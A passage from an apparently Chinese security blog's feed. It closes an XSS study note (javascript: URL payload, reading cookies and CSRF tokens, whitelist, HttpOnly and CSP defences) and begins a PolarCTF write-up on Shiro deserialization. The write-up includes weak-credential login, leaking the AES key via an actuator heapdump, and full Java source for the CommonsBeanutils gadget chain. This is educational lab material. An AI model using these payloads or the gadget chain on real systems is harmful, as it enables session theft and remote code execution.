class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    user_input = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;href_test.html&#x27;</span>, user_input=user_input)<br><br><span class="hljs-comment">#href_test.html:</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>    &lt;a href=<span class="hljs-string">&quot;&#123;&#123; user_input &#125;&#125;&quot;</span>&gt;click here&lt;/a&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><code>name=javascript:alert(1)</code></p><p><img src="/img/xss_1_4.png" alt="xss_1_4"></p><p>ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿ</p><p><code>javascript: alert(&#39;1&#39;)</code> æ˜¯ä¸€ç§ç§°ä¸º <strong>JavaScript URL</strong> çš„ä¼ªåè®®ã€‚è¿™ç§ URL ä»¥ <code>javascript:</code> ä½œä¸ºå‰ç¼€ï¼Œåé¢è·Ÿéšä¸€æ®µ <code>JavaScript</code> ä»£ç ã€‚ç‚¹å‡»é“¾æ¥æ—¶ï¼Œæµè§ˆå™¨ä¼šæ‰§è¡Œè¿™æ®µä»£ç ï¼Œè€Œä¸æ˜¯å¯¼èˆªåˆ°ä¸€ä¸ªæ–°çš„é¡µé¢</p><p>é˜²å¾¡å¾ˆç®€å•ï¼Œæ¯”å¦‚ç›´æ¥æ£€æµ‹ç”¨æˆ·è¾“å…¥æ˜¯ä¸æ˜¯<code>http</code>æˆ–è€…<code>https</code>å¼€å¤´å°±è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    white_list_href = [<span class="hljs-string">&#x27;http://&#x27;</span>, <span class="hljs-string">&#x27;https://&#x27;</span>]<br>    user_input = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>)<br>    <span class="hljs-keyword">for</span> href <span class="hljs-keyword">in</span> white_list_href:<br>         <span class="hljs-keyword">if</span> user_input.startswith(href):<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;href_test.html&#x27;</span>, user_input=user_input)<br>         <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;404.html&#x27;</span>)<br></code></pre></td></tr></table></figure><p>æˆ–è€…è®¾ç½®<code>CSP</code>ã€‚è¿™ä¸œè¥¿å…¶å®å°±æ˜¯å‘Šè¯‰æµè§ˆå™¨å“ªäº›æ¥æºçš„èµ„æºå¯ä»¥è¢«è½½å…¥ï¼Œå“ªäº›ä¸è¡Œã€‚è¿™ä¸ªåœ¨ç¬¬å››éƒ¨åˆ†è¯¦ç»†è®°å½•ã€‚</p><h3 id="0x03-å±å®³"><a href="#0x03-å±å®³" class="headerlink" title="0x03 å±å®³"></a>0x03 å±å®³</h3><p> ä¸ªäººè®¤ä¸ºXSSä¸»è¦æŸå®³æœ‰ä¸¤ç§ï¼š</p><ol><li>æ‹¿cookie&#x2F;csrf token</li><li>é€šè¿‡XSSè¿›è¡ŒæŸäº›é‡è¦æ“ä½œ(æ‰“API)</li></ol><p>æ‹¿cookieæ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯åˆ©ç”¨<code>JS</code>ä¸­è®¿é—®å½“å‰é¡µé¢çš„<code>API</code> <code>document.cookie</code>:</p><p><img src="/img/xss_1_5.png" alt="xss_1_5"></p><p>å¯¹äºè¿™ç§æ”»å‡»å…¶å®åœ¨è®¾ç½®cookieçš„æ—¶å€™ä»¤<code>HttpOnly=True</code>ï¼ˆCookie åªèƒ½é€šè¿‡æœåŠ¡å™¨ç«¯è®¿é—®ï¼Œä¸èƒ½é€šè¿‡ JavaScript è¯»å–ï¼‰å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">response.set_cookie(<span class="hljs-string">&#x27;session_id&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>,secure=<span class="hljs-literal">True</span>,httponly=<span class="hljs-literal">True</span>,samesite=<span class="hljs-string">&#x27;None&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ä¹Ÿèƒ½æ‹¿csrf tokenï¼Œæ¯”å¦‚åœ¨ä¸€ä¸ªDjangoé¡¹ç›®ä¸­è¡¨å•å­˜åœ¨å¦‚ä¸‹å­—æ®µ:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">input type=&quot;hidden&quot; name=&quot;csrfmiddlewaretoken&quot; value=&quot;AJTIijF8AHYNngTRCMDlAMswYAvmrFvIUxAL9RzsveUVsJJk7OgcAptN3aHdJtqY&quot;&gt;<br></code></pre></td></tr></table></figure><p>å¦‚ä½•æ‹¿åˆ°è¿™ä¸ªéšè—å­—æ®µçš„å€¼å‘¢ï¼Ÿå¯ä»¥åˆ©ç”¨ï¼š</p><p><code>alert(document.querySelector(&#39;input[name=&quot;csrfmiddlewaretoken&quot;]&#39;).value);</code></p><p><img src="/img/xss_1_6.png" alt="xss_1_6"></p><p>ç¬¬äºŒç§å°±æ˜¯æ‰“ç‰¹å®šçš„APIï¼Œæ¯”å¦‚æ‰§è¡Œå¦‚ä¸‹<code>js</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br>  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>    xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;/change_cookie&#x27;</span>, <span class="hljs-literal">true</span>);<br>    xhr.<span class="hljs-property">withCredentials</span> = <span class="hljs-literal">true</span>; <br>    xhr.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Response from /change_cookie:&#x27;</span>, xhr.<span class="hljs-property">responseText</span>);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Failed to fetch /change_cookie:&#x27;</span>, xhr.<span class="hljs-property">statusText</span>);<br>      &#125;<br>    &#125;;<br>    xhr.<span class="hljs-title function_">send</span>();<br>  &#125;;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3 id="0x04-åˆ©ç”¨CSPé˜²æŠ¤XSS"><a href="#0x04-åˆ©ç”¨CSPé˜²æŠ¤XSS" class="headerlink" title="0x04 åˆ©ç”¨CSPé˜²æŠ¤XSS"></a>0x04 åˆ©ç”¨CSPé˜²æŠ¤XSS</h3><p>CSP é€šè¿‡å®šä¹‰å…è®¸åŠ è½½çš„èµ„æºï¼ˆå¦‚è„šæœ¬ã€æ ·å¼ã€å›¾ç‰‡ã€æ¡†æ¶ç­‰ï¼‰çš„æ¥æºï¼Œé™åˆ¶æµè§ˆå™¨å¯ä»¥æ‰§è¡Œå“ªäº›èµ„æº</p><p>èˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœæˆ‘å¾ˆç¢ºå®šç¶²ç«™ä¸Šçš„ JS éƒ½ä¾†è‡ªæ–¼åŒä¸€å€‹ originï¼Œé‚£æˆ‘çš„ CSP å°±å¯ä»¥é€™æ¨£å¯«ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs none">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;<br>#<br>    default-src æ˜¯ CSP çš„ä¸€ç§æŒ‡ä»¤ï¼Œç”¨äºæŒ‡å®šé»˜è®¤èµ„æºåŠ è½½çš„æ¥æºï¼ŒåŒ…æ‹¬è„šæœ¬ã€æ ·å¼ã€å›¾ç‰‡ã€å­—ä½“ã€Ajax è¯·æ±‚ç­‰ã€‚<br>    &#x27;self&#x27; è¡¨ç¤ºåªå…è®¸ä»ä¸å½“å‰ç½‘é¡µç›¸åŒçš„æ¥æºï¼ˆå³ç›¸åŒçš„åŸŸåã€åè®®å’Œç«¯å£ï¼‰åŠ è½½èµ„æºã€‚<br>#<br>    script-src æ˜¯ CSP çš„å¦ä¸€æŒ‡ä»¤ï¼Œä¸“é—¨ç”¨äºæ§åˆ¶ JavaScript èµ„æºçš„åŠ è½½ã€‚<br>    &#x27;self&#x27; åŒæ ·è¡¨ç¤ºåªèƒ½ä»å½“å‰ç½‘é¡µçš„åŸŸååŠ è½½è„šæœ¬æ–‡ä»¶ã€‚<br></code></pre></td></tr></table></figure><p><code>self</code> ä»£è¡¨çš„æ˜¯ same origin çš„æ„æ€ã€‚é€™æ¨£å¯«çš„è©±ï¼Œå¦‚æœä½ è©¦è‘—è¼‰å…¥ä¸æ˜¯ç•¶å‰ origin çš„ JSï¼Œæˆ–è€…æ˜¯ç›´æ¥åœ¨é é¢ä¸Šç”¨ inline çš„æ–¹å¼åŸ·è¡Œ scriptï¼Œéƒ½æœƒçœ‹åˆ°ç€è¦½å™¨å ±éŒ¯ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PolarOA_shiroååºåˆ—åŒ–å­¦ä¹ </title>
    <link href="/2024/05/30/%E4%BB%8EPolarOA%E4%B8%80%E9%A2%98%E7%9C%8Bshiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/"/>
    <url>/2024/05/30/%E4%BB%8EPolarOA%E4%B8%80%E9%A2%98%E7%9C%8Bshiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>å”‰ï¼Œå­¦</p><span id="more"></span><h3 id="0x01-å‰è¨€"><a href="#0x01-å‰è¨€" class="headerlink" title="0x01 å‰è¨€"></a>0x01 å‰è¨€</h3><p>å‰å‡ å¤©å‚åŠ äº†<code>polarctf</code>ï¼Œå› ä¸ºæ²¡æ€ä¹ˆå­¦è¿‡<code>shiro</code>å¯¼è‡´å½“æ—¶<code>polarOA</code>è¿™é“<code>java</code>é¢˜æ²¡è§£å‡ºæ¥ï¼Œç‰¹æ­¤è®°å½•ã€‚</p><h3 id="0x02-PolarOA2-0"><a href="#0x02-PolarOA2-0" class="headerlink" title="0x02 PolarOA2.0"></a>0x02 PolarOA2.0</h3><p>è¿™é‡Œç›´æ¥æ”¾é¢˜ç›®äº†ï¼š</p><p>è¿›ç¯å¢ƒå‘ç°æ˜¯ä¸ªç™»å½•ç•Œé¢ï¼ŒæŠ“åŒ…å‘ç°å­˜åœ¨<code>RememberMe</code>å­—æ®µï¼Œåˆæ­¥çŒœæµ‹è€ƒç‚¹æ˜¯<code>shiro</code>ï¼š</p><p><img src="/img/polarOA_1.png" alt="polarOA_1"></p><blockquote><p>ç®€å•æä¸‹æ¼æ´åŸç†ï¼š</p><p>Apache Shiroæ¡†æ¶çš„è®°ä½å¯†ç åŠŸèƒ½ï¼Œç”¨æˆ·ç™»å½•åç”ŸæˆåŠ å¯†ç¼–ç çš„cookieã€‚æœåŠ¡ç«¯å¯¹è®°ä½å¯†ç äº§ç”Ÿçš„cookieè¿›è¡Œbase64è§£å¯†ï¼Œå†è¿›è¡ŒAESè§£å¯†ï¼Œä¹‹åè¿›è¡Œååºåˆ—åŒ–ï¼Œå¯¼è‡´äº†ååºåˆ—åŒ–æ¼æ´ã€‚</p><p>å®¢æˆ·ç«¯ï¼šå‘½ä»¤&#x3D;&gt;åºåˆ—åŒ–&#x3D;&gt;AESåŠ å¯†&#x3D;&gt;base64ç¼–ç &#x3D;&gt;RememberMe Cookieå€¼</p><p>æœåŠ¡ç«¯ï¼šRememberMe Cookieå€¼&#x3D;&gt;base64è§£å¯†&#x3D;&gt;AESè§£å¯†&#x3D;&gt;ååºåˆ—åŒ–</p></blockquote><p>è¿™æ ·ä¸€æ¥AESåŠ å¯†å¯†é’¥è‡³å…³é‡è¦ï¼Œä½†ä½¿ç”¨å·¥å…·æ— æ³•è·å¾—å¯†é’¥ï¼Œçˆ†ç ´ä¸å‡ºæ¥(å¯èƒ½ç”¨äº†é«˜ç‰ˆæœ¬<code>shiro</code>)ï¼š</p><p><img src="/img/polar_2.png" alt="polar_2"></p><p>å› ä¸ºä¸ç™»é™†å°±æ²¡æ³•æ‹¿<code>cookie</code>å€¼ï¼Œæƒ³äº†æƒ³æœ‰æ²¡æœ‰å…¶å®ƒæ–¹å¼è·å–<code>key</code>ï¼š</p><p><a href="https://xz.aliyun.com/t/9763">springç«¯ç‚¹æ³„éœ²</a></p><p>ä½†å½“æ—¶å°è¯•è®¿é—®<code>url/actuator/env</code>å’Œ<code>url/env</code>ç›´æ¥è¿›æŠ¥é”™é¡µé¢äº†ï¼Œåæ¥çœ‹<code>wp</code>æ‰çŸ¥é“å¾—å…ˆç™»å½•ğŸ˜Ÿ</p><p>å¼±å£ä»¤ <code>admin</code>,<code>admin123</code>ï¼š</p><p><img src="/img/polaroa_3.png" alt="polaroa_3"></p><p>å†è®¿é—®<code>url/actuator/env</code>å‘ç°ç¡®å®å­˜åœ¨æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼š</p><p><img src="/img/polaroa_4-17173185458225.png" alt="polaroa_4"></p><p><code>polar</code>è¿™ä¸ªé¶åœºæŒºæçš„ï¼Œè¿™é‡Œçœ‹åˆ°ç¯å¢ƒå˜é‡é‡Œå·²ç»æœ‰<code>flag</code>äº†ï¼Œä½†äº¤ä¸ä¸Šå»(ä¹‹å‰åšé‚£ä¸ªXEEçš„é¢˜ä¹Ÿæ˜¯ï¼Œ<code>phpinfo</code>æ©æœåˆ°äº†<code>flag</code>ï¼Œä½†æˆ‘å°±æ˜¯äº¤ä¸ä¸Šå»ğŸ¤¬)ï¼š</p><p><img src="/img/polaroa_5.png" alt="polaroa_5"></p><p>ç„¶åé€šè¿‡ <code>/actuator/heapdump</code> è¿™ä¸ªè·¯ç”±å¯¼å‡º <code>jvm </code>ä¸­çš„å †å†…å­˜ä¿¡æ¯ï¼Œå»ç¿»<code>shiro key</code>ï¼š</p><p><img src="/img/polaroa_7.png" alt="polaroa_7"></p><p><code>BV0oz7n9/LtRqn1RENB+Yw==</code>å¯ç”¨</p><p>ä½†è¿™é‡Œå­˜åœ¨é—®é¢˜ï¼Œæ¢æµ‹åˆ©ç”¨é“¾å‘ç°æ— å¯åˆ©ç”¨é“¾ï¼š</p><p><img src="/img/polaroa_6.png" alt="polaroa_6"></p><p>è¿™é‡Œå»çœ‹äº†å‡ºé¢˜äººçš„åšå®¢ï¼š</p><blockquote><p>çˆ†ç ´æ‰€æœ‰åˆ©ç”¨é“¾å‘ç°ï¼Œæ²¡æœ‰å¯åˆ©ç”¨çš„é“¾ï¼ˆå…¶å®ä¸æ˜¯ï¼Œæ²¡æœ‰çˆ†ç ´å‡ºæ¥æ˜¯å› ä¸ºå¯¹Cookieé•¿åº¦åšäº†é™åˆ¶ï¼Œå¯æµ‹è¯•å‡ºä¼ å…¥Cookieçš„å­—ç¬¦ä¸²éœ€è¦å°äºçº¦3500ä¸ªå­—ç¬¦ï¼‰</p></blockquote><p><code>Shiro</code>æ˜¯ä¾èµ–äº<code>commons-beanutils</code>çš„ï¼Œæ¯”å¦‚å¯¹äºå¦‚ä¸‹<code>pom.xml</code>ï¼Œæˆ‘å¹¶æ²¡æœ‰å¼•å…¥ä»»ä½•æœ‰å…³<code>cb</code>çš„ä¾èµ–ï¼Œä½†å´å¯ä»¥å‘ç°é€šè¿‡å¼•å…¥<code>shiro 1.2.4</code>é—´æ¥å¼•å…¥<code>cb1.8.3</code>:</p><p><img src="/img/polaroa_9.png" alt=""></p><p>æ¥ä¸‹æ¥æœ‰ä¸¤ä¸ªé—®é¢˜ï¼š</p><ul><li><p>æ²¡æœ‰<code>CC</code>ä¾èµ–æ€ä¹ˆæ‰“<code>shiro</code>ååºåˆ—åŒ–ï¼Ÿ</p></li><li><p>éœ€è¦ç¼©çŸ­æˆ‘ä»¬çš„<code>payload</code>ï¼Œæ€ä¹ˆç¼©çŸ­ï¼Ÿ</p></li></ul><p>ç¬¬ä¸€ä¸ªé—®é¢˜ï¼š</p><p><a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html">å‚è€ƒæ–‡ç« </a></p><p>å…ˆå¤ä¹ ä¸€ä¸‹<code>CB1</code>è¿™æ¡é“¾å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TESTCB1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Clac.class&quot;</span>));<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-comment">//    templates.newTransformer();</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        <span class="hljs-comment">// åˆ›å»ºæ–°çš„é˜Ÿåˆ—ï¼Œå¹¶æ·»åŠ æ¶æ„å­—èŠ‚ç </span><br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, beanComparator);<br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">//å¯ä»¥çœ‹ä¸‹beanComparatorçš„æ„é€ æ–¹æ³•ï¼šè¿™é‡ŒæŠŠpropertyçš„å€¼è®¾ç½®ä¸ºoutputPropertiesï¼Œç›®çš„æ˜¯è°ƒç”¨getOutputProperties()è¿™ä¸ªæ–¹æ³•</span><br>        setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates, templates&#125;);<br>        <span class="hljs-comment">//serialize(queue);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="/img/polaroa_10.jpg" alt="polaroa_10"></p><p>æ³¨æ„<code>pom.xml</code>ä¸­çš„ä¸€äº›ä¾èµ–ï¼Œæ³¨æ„<code>CB</code>çš„ç‰ˆæœ¬è¦å’Œ<code>shiro</code>ç»™çš„å¯¹ä¸Šï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.8.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-spring<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å¥½ï¼Œé‚£æˆ‘ä»¬ç°åœ¨åˆ æ‰è¿™ä¸ªccä¾èµ–ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</p><p><img src="/img/polaroa_11.png" alt="polaroa_11"></p><blockquote><p>Exception in thread â€œmainâ€ java.lang.NoClassDefFoundError: org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;comparators&#x2F;ComparableComparator<br>    at org.apache.commons.beanutils.BeanComparator.<init>(BeanComparator.java:81)<br>    at org.apache.commons.beanutils.BeanComparator.<init>(BeanComparator.java:59)<br>    at TESTCB1.main(TESTCB1.java:20)<br>Caused by: java.lang.ClassNotFoundException: org.apache.commons.collections.comparators.ComparableComparator<br>    at java.net.URLClassLoader.findClass(URLClassLoader.java:387)<br>    at java.lang.ClassLoader.loadClass(ClassLoader.java:418)<br>    at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:359)<br>    at java.lang.ClassLoader.loadClass(ClassLoader.java:351)</p></blockquote><p> <code>NoClassDefFoundError</code> å¼‚å¸¸ï¼Œæ‰¾ä¸åˆ° <code>org/apache/commons/collections/comparators/ComparableComparator</code> 